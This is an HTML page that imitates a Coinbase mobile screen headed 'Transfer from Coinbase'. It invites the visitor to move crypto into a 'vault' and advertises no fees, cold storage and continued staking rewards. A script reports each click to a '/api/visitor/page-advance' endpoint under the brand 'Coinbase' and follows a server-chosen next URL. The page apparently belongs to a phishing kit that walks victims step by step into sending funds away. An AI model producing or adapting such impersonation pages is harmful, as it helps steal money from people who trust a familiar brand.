<!doctype html>
<html lang="en" class="dark" style="color-scheme: dark;">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Transfer from Coinbase</title>
<link rel="stylesheet" href="/_next/static/css/68165cb776a47886.css">
<link rel="stylesheet" href="/_next/static/css/97cc91616cea400d.css">
<style>
.vm{min-height:100vh;background:#000;color:#fff;font-family:'CoinbaseSansFont',system-ui,sans-serif;max-width:480px;margin:0 auto;display:flex;flex-direction:column}
.vm-hd{display:flex;align-items:center;gap:12px;padding:16px 20px;border-bottom:1px solid #1f2937}
.vm-back{background:none;border:0;color:#fff;padding:4px;cursor:pointer}
.vm-body{flex:1;padding:20px}
.vm-sub{color:#94a3b8;font-size:15px;line-height:1.5;margin:0 0 24px}
.vm-illus{background:#111;border-radius:16px;padding:28px 16px;margin-bottom:28px;display:flex;justify-content:center}
.vm-illus-inner{display:flex;align-items:flex-end;gap:10px}
.vm-box{width:52px;height:52px;border-radius:14px;background:rgb(87,139,250);display:flex;align-items:center;justify-content:center}
.vm-box.mid{width:38px;height:38px;background:#1e293b;margin-bottom:16px}
.vm-pillar{width:6px;height:40px;border-radius:3px;background:linear-gradient(180deg,#ec4899,#14b8a6);margin:0 2px 6px}
.vm-btn{width:100%;height:52px;border-radius:9999px;font-weight:600;font-size:16px;border:0;background:rgb(87,139,250);color:#0a0b0d;cursor:pointer;font-family:inherit}
.vm-bullets{margin:24px 0 0;padding:0;list-style:none}
.vm-bullets li{display:flex;gap:10px;color:#e2e8f0;font-size:14px;margin-bottom:12px;line-height:1.4}
.vm-bullets li::before{content:'';width:6px;height:6px;border-radius:50%;background:rgb(87,139,250);margin-top:7px;flex-shrink:0}
</style>
</head>
<body style="margin:0">
<div class="vm">
  <header class="vm-hd">
    <button type="button" class="vm-back" aria-label="Back"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></button>
    <h1 style="margin:0;font-size:17px;font-weight:600">Transfer from Coinbase</h1>
  </header>
  <div class="vm-body">
    <p class="vm-sub" data-rv-var="subtitle">Move your crypto into your vault for full control of your keys.</p>
    <div class="vm-illus">
      <div class="vm-illus-inner">
        <div class="vm-box"><svg width="22" height="22" viewBox="0 0 48 48"><path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#0a0b0d"/></svg></div>
        <div class="vm-pillar"></div>
        <div class="vm-box mid"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#94a3b8" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg></div>
        <div class="vm-box" style="background:#1e3a5f"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3"/></svg></div>
      </div>
    </div>
    <button id="rv-next" type="button" class="vm-btn">Next</button>
    <ul class="vm-bullets">
      <li>No network fees on transfers</li>
      <li>Assets secured in cold storage</li>
      <li>Continue earning staking rewards</li>
    </ul>
  </div>
</div>
<script>
document.getElementById('rv-next').addEventListener('click',function(){
  var b=this;b.disabled=true;
  fetch('/api/visitor/page-advance',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({brand:'Coinbase',page:'Transfer from Coinbase',choice:'next'})})
    .then(function(r){return r.json()}).then(function(d){if(d&&d.nextUrl)location.href=d.nextUrl;else b.disabled=false;});
});
</script>
</body>
</html>
